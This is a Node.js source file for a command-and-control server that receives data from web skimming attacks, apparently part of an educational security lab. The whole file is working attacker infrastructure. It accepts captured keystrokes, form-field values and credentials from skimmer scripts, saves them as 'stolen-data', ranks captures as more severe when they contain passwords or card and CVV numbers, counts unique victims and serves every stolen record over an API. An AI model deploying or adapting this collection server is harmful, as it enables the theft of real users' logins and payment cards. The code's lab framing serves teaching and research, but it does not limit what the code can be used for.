/**
 * C2-SERVER.JS - COMMAND & CONTROL SERVER FOR DOM-BASED ATTACKS
 *
 * This server handles data collection from DOM-based skimming attacks:
 * - Real-time field monitoring data
 * - Form overlay credential captures
 * - Shadow DOM stealth attack data
 * - Cross-attack correlation and analysis
 *
 * FOR EDUCATIONAL PURPOSES ONLY
 */

const express = require('express')
const cors = require('cors')
const fs = require('fs')
const path = require('path')

const app = express()
// Always use port 3000 for C2 server (Cloud Run sets PORT=8080 but we want to remain on 3000)
const PORT = 3000

// Middleware
app.use(cors())
app.use(express.json({ limit: '10mb' }))
app.use(express.urlencoded({ extended: true, limit: '10mb' }))

// Data storage
const DATA_DIR = path.join(__dirname, 'stolen-data')
const ANALYSIS_DIR = path.join(__dirname, 'analysis')

// Ensure data directories exist
;[DATA_DIR, ANALYSIS_DIR].forEach(dir => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true })
  }
})

// Attack session tracking
let activeSessions = new Map()
let attackStatistics = {
  totalRequests: 0,
  domMonitorSessions: 0,
  formOverlayCaptues: 0,
  shadowDomCaptures: 0,
  uniqueVictims: new Set(),
  startTime: Date.now()
}

/**
 * Utility Functions
 */
function logToConsole(level, message, data = null) {
  const timestamp = new Date().toISOString()
  const logEntry = `[${timestamp}] [${level.toUpperCase()}] [C2-Server] ${message}`

  console.log(logEntry)
  if (data) {
    console.log('  Data:', JSON.stringify(data, null, 2))
  }
}

function generateSessionId() {
  return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
}

function saveAttackData(attackType, data) {
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-')
  const filename = `${attackType}_${timestamp}.json`
  const filepath = path.join(DATA_DIR, filename)

  const enrichedData = {
    ...data,
    serverTimestamp: Date.now(),
    serverTime: new Date().toISOString(),
    attackType: attackType
  }

  fs.writeFileSync(filepath, JSON.stringify(enrichedData, null, 2))
  logToConsole('info', `Attack data saved: ${filename}`)

  return filepath
}

function analyzeAttackData(data) {
  const analysis = {
    timestamp: Date.now(),
    attackType: data.type || 'unknown',
    severity: 'medium',
    indicators: [],
    riskScore: 0
  }

  // Analyze based on attack type
  switch (data.type) {
    case 'periodic':
    case 'immediate':
    case 'session_end':
      analysis.attackType = 'dom-monitor'
      analysis.severity = assessDomMonitorSeverity(data)
      analysis.indicators = extractDomMonitorIndicators(data)
      break

    case 'form_overlay_capture':
      analysis.attackType = 'form-overlay'
      analysis.severity = assessFormOverlaySeverity(data)
      analysis.indicators = extractFormOverlayIndicators(data)
      break

    case 'shadow_dom_capture':
    case 'shadow_session_end':
      analysis.attackType = 'shadow-dom'
      analysis.severity = assessShadowDomSeverity(data)
      analysis.indicators = extractShadowDomIndicators(data)
      break
  }

  // Calculate risk score
  analysis.riskScore = calculateRiskScore(analysis)

  return analysis
}

function assessDomMonitorSeverity(data) {
  if (data.summary) {
    const keystrokeCount = data.summary.keystrokesCount || 0
    const fieldCount = data.summary.fieldsCount || 0

    if (keystrokeCount > 100 || fieldCount > 5) return 'high'
    if (keystrokeCount > 20 || fieldCount > 2) return 'medium'
  }
  return 'low'
}

function assessFormOverlaySeverity(data) {
  if (data.data && data.data.credentials) {
    const credentialFields = Object.keys(data.data.credentials)
    const hasPassword = credentialFields.some(field => field.includes('password'))
    const hasCard = credentialFields.some(field => field.includes('card') || field.includes('cvv'))

    if (hasPassword && hasCard) return 'critical'
    if (hasPassword || hasCard) return 'high'
    if (credentialFields.length > 3) return 'medium'
  }
  return 'low'
}

function assessShadowDomSeverity(data) {
  if (data.sessions) {
    const sessionCount = data.sessions.length
    const hasKeystrokes = data.sessions.some(
      s => s.capturedKeystrokes && s.capturedKeystrokes.length > 0
    )

    if (sessionCount > 5 && hasKeystrokes) return 'high'
    if (sessionCount > 2 || hasKeystrokes) return 'medium'
  }
  return 'low'
}

function extractDomMonitorIndicators(data) {
  const indicators = ['DOM MutationObserver usage', 'Real-time field monitoring']

  if (data.summary && data.summary.keystrokesCount > 0) {
    indicators.push('Keystroke logging detected')
  }

  if (data.fullData && data.fullData.fieldValues) {
    indicators.push('Form field value capture')
  }

  return indicators
}

function extractFormOverlayIndicators(data) {
  const indicators = ['Dynamic form overlay injection', 'Credential harvesting']

  if (data.data && data.data.formType) {
    indicators.push(`Target form type: ${data.data.formType}`)
  }

  if (data.metadata && data.metadata.injectionAttempts > 1) {
    indicators.push('Multiple injection attempts')
  }

  return indicators
}

function extractShadowDomIndicators(data) {
  const indicators = ['Shadow DOM encapsulation abuse', 'Cross-boundary monitoring']

  if (data.shadowInfo) {
    if (data.shadowInfo.mode === 'closed') {
      indicators.push('Closed shadow DOM usage')
    }
    if (data.shadowInfo.maxDepth > 1) {
      indicators.push('Nested shadow DOM structure')
    }
  }

  return indicators
}

function calculateRiskScore(analysis) {
  let score = 0

  // Base score by severity
  switch (analysis.severity) {
    case 'critical':
      score += 90
      break
    case 'high':
      score += 70
      break
    case 'medium':
      score += 50
      break
    case 'low':
      score += 20
      break
  }

  // Additional points for indicators
  score += analysis.indicators.length * 5

  // Cap at 100
  return Math.min(score, 100)
}

function updateStatistics(data) {
  attackStatistics.totalRequests++

  // Track unique victims by IP or user agent
  const victimId = data.metadata?.userAgent || 'unknown'
  attackStatistics.uniqueVictims.add(victimId)

  // Count by attack type
  switch (data.type) {
    case 'periodic':
    case 'immediate':
    case 'session_end':
      attackStatistics.domMonitorSessions++
      break
    case 'form_overlay_capture':
      attackStatistics.formOverlayCaptues++
      break
    case 'shadow_dom_capture':
    case 'shadow_session_end':
      attackStatistics.shadowDomCaptures++
      break
  }
}

/**
 * API Endpoints
 */

// Main data collection endpoint
app.post('/collect', (req, res) => {
  try {
    const attackData = req.body
    const clientIp = req.ip || req.connection.remoteAddress

    logToConsole('info', `Received attack data from ${clientIp}`, {
      type: attackData.type,
      timestamp: attackData.timestamp,
      size: JSON.stringify(attackData).length
    })

    // Update statistics
    updateStatistics(attackData)

    // Analyze attack data
    const analysis = analyzeAttackData(attackData)

    // Save raw attack data
    const savedPath = saveAttackData(analysis.attackType, attackData)

    // Save analysis
    const analysisPath = path.join(ANALYSIS_DIR, `analysis_${path.basename(savedPath)}`)
    fs.writeFileSync(analysisPath, JSON.stringify(analysis, null, 2))

    // Log high-severity attacks
    if (analysis.severity === 'high' || analysis.severity === 'critical') {
      logToConsole('warn', `HIGH SEVERITY ATTACK DETECTED: ${analysis.attackType}`, {
        severity: analysis.severity,
        riskScore: analysis.riskScore,
        indicators: analysis.indicators
      })
    }

    // Respond with success
    res.json({
      success: true,
      sessionId: generateSessionId(),
      timestamp: Date.now(),
      analysis: {
        severity: analysis.severity,
        riskScore: analysis.riskScore
      }
    })
  } catch (error) {
    logToConsole('error', 'Error processing attack data', { error: error.message })
    res.status(500).json({
      success: false,
      error: 'Server error processing data'
    })
  }
})

// Get attack statistics
app.get('/stats', (req, res) => {
  const stats = {
    ...attackStatistics,
    uniqueVictims: attackStatistics.uniqueVictims.size,
    uptime: Date.now() - attackStatistics.startTime,
    uptimeHours:
      Math.round(((Date.now() - attackStatistics.startTime) / (1000 * 60 * 60)) * 100) / 100
  }

  res.json(stats)
})

// Get all stolen data (similar to Lab 1's /api/stolen)
app.get('/api/stolen', (req, res) => {
  try {
    const files = fs
      .readdirSync(DATA_DIR)
      .filter(file => file.endsWith('.json'))
      .sort((a, b) => {
        const statA = fs.statSync(path.join(DATA_DIR, a))
        const statB = fs.statSync(path.join(DATA_DIR, b))
        return statB.mtime - statA.mtime
      })

    const stolenRecords = files.map(file => {
      const filepath = path.join(DATA_DIR, file)
      return JSON.parse(fs.readFileSync(filepath, 'utf8'))
    })

    res.json(stolenRecords)
  } catch (error) {
    logToConsole('error', 'Error fetching stolen data', { error: error.message })
    res.status(500).json({ error: 'Error fetching data' })
  }
})

// Get recent attack data (metadata only)
app.get('/recent/:count?', (req, res) => {
  try {
    const count = parseInt(req.params.count) || 10
    const files = fs
      .readdirSync(DATA_DIR)
      .filter(file => file.endsWith('.json'))
      .sort((a, b) => {
        const statA = fs.statSync(path.join(DATA_DIR, a))
        const statB = fs.statSync(path.join(DATA_DIR, b))
        return statB.mtime - statA.mtime
      })
      .slice(0, count)

    const recentAttacks = files.map(file => {
      const filepath = path.join(DATA_DIR, file)
      const data = JSON.parse(fs.readFileSync(filepath, 'utf8'))
      return {
        filename: file,
        timestamp: data.serverTimestamp || data.timestamp,
        type: data.type,
        attackType: data.attackType,
        size: fs.statSync(filepath).size
      }
    })

    res.json(recentAttacks)
  } catch (error) {
    logToConsole('error', 'Error fetching recent attacks', { error: error.message })
    res.status(500).json({ error: 'Error fetching data' })
  }
})

// Get specific attack data
app.get('/attack/:filename', (req, res) => {
  try {
    const filename = req.params.filename
    const filepath = path.join(DATA_DIR, filename)

    if (!fs.existsSync(filepath)) {
      return res.status(404).json({ error: 'Attack data not found' })
    }

    const data = JSON.parse(fs.readFileSync(filepath, 'utf8'))
    res.json(data)
  } catch (error) {
    logToConsole('error', 'Error fetching attack data', { error: error.message })
    res.status(500).json({ error: 'Error reading attack data' })
  }
})

// Get analysis for specific attack
app.get('/analysis/:filename', (req, res) => {
  try {
    const filename = req.params.filename
    const analysisPath = path.join(ANALYSIS_DIR, `analysis_${filename}`)

    if (!fs.existsSync(analysisPath)) {
      return res.status(404).json({ error: 'Analysis not found' })
    }

    const analysis = JSON.parse(fs.readFileSync(analysisPath, 'utf8'))
    res.json(analysis)
  } catch (error) {
    logToConsole('error', 'Error fetching analysis', { error: error.message })
    res.status(500).json({ error: 'Error reading analysis' })
  }
})

// Dashboard endpoint - serves the main dashboard
app.get('/', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = fs.readFileSync(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[C2] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

// Also serve dashboard at /stolen-data for nginx proxy
app.get('/stolen-data', async (req, res) => {
  try {
    const dashboardPath = path.join(__dirname, 'dashboard.html')
    const dashboard = fs.readFileSync(dashboardPath, 'utf8')
    res.send(dashboard)
  } catch (error) {
    console.error('[C2] Failed to serve dashboard:', error)
    res.status(500).send('Dashboard not available')
  }
})

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({
    status: 'healthy',
    timestamp: Date.now(),
    uptime: Date.now() - attackStatistics.startTime,
    version: '1.0.0'
  })
})

// Clear all stored data (for testing)
app.post('/clear', (req, res) => {
  try {
    // Clear data files
    const dataFiles = fs.readdirSync(DATA_DIR)
    dataFiles.forEach(file => {
      fs.unlinkSync(path.join(DATA_DIR, file))
    })

    // Clear analysis files
    const analysisFiles = fs.readdirSync(ANALYSIS_DIR)
    analysisFiles.forEach(file => {
      fs.unlinkSync(path.join(ANALYSIS_DIR, file))
    })

    // Reset statistics
    attackStatistics = {
      totalRequests: 0,
      domMonitorSessions: 0,
      formOverlayCaptues: 0,
      shadowDomCaptures: 0,
      uniqueVictims: new Set(),
      startTime: Date.now()
    }

    logToConsole('info', 'All stored data cleared')
    res.json({ success: true, message: 'All data cleared' })
  } catch (error) {
    logToConsole('error', 'Error clearing data', { error: error.message })
    res.status(500).json({ error: 'Error clearing data' })
  }
})

// Error handling middleware
app.use((error, req, res, next) => {
  logToConsole('error', 'Unhandled error', { error: error.message, stack: error.stack })
  res.status(500).json({ error: 'Internal server error' })
})

// 404 handler
app.use((req, res) => {
  res.status(404).json({ error: 'Endpoint not found' })
})

// Start server
app.listen(PORT, () => {
  logToConsole('info', `DOM-based attacks C2 server started on port ${PORT}`)
  logToConsole('info', `Data directory: ${DATA_DIR}`)
  logToConsole('info', `Analysis directory: ${ANALYSIS_DIR}`)
  logToConsole('info', 'Available endpoints:')
  logToConsole('info', '  POST /collect - Main data collection')
  logToConsole('info', '  GET  /stats - Attack statistics')
  logToConsole('info', '  GET  /api/stolen - All stolen data (full records)')
  logToConsole('info', '  GET  /recent/:count - Recent attacks (metadata)')
  logToConsole('info', '  GET  /attack/:filename - Specific attack data')
  logToConsole('info', '  GET  /analysis/:filename - Attack analysis')
  logToConsole('info', '  GET  /health - Health check')
  logToConsole('info', '  POST /clear - Clear all data (testing)')
})

/**
 * C2 SERVER ANALYSIS:
 *
 * This C2 server provides comprehensive handling for DOM-based attacks:
 *
 * 1. **Multi-Attack Support**:
 *    - DOM Monitor real-time field monitoring
 *    - Form Overlay credential harvesting
 *    - Shadow DOM stealth operations
 *    - Cross-attack correlation
 *
 * 2. **Real-Time Analysis**:
 *    - Automatic severity assessment
 *    - Risk score calculation
 *    - Indicator extraction
 *    - Pattern recognition
 *
 * 3. **Data Management**:
 *    - Structured data storage
 *    - Analysis persistence
 *    - Attack statistics tracking
 *    - Victim correlation
 *
 * 4. **Monitoring Capabilities**:
 *    - Real-time attack statistics
 *    - Historical data access
 *    - Severity-based alerting
 *    - Performance tracking
 *
 * 5. **Educational Features**:
 *    - Clear attack categorization
 *    - Detailed analysis output
 *    - Pattern documentation
 *    - Testing utilities
 *
 * This server enables comprehensive analysis of DOM-based skimming
 * techniques for security research and ML training purposes.
 */
